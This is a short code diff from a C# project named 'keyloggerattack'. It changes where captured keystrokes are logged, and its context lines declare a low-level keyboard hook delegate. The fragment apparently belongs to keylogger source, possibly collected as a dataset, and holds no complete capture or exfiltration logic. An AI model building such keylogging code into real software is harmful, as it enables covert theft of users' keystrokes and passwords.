@@ -19,7 +19,10 @@ namespace keyloggerattack
     {
         // 記錄檔路徑
         //在這裡自訂記錄檔的儲存位置，例如: "C:\\log.txt"，必須加上檔案名稱和附檔名。
-        readonly public static string logPath = "D:\\log.txt";
+        
+
+
+        readonly public static string logPath = @"..\..\..\keyloggerattack\Dataset\log.txt";
         // 委託 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
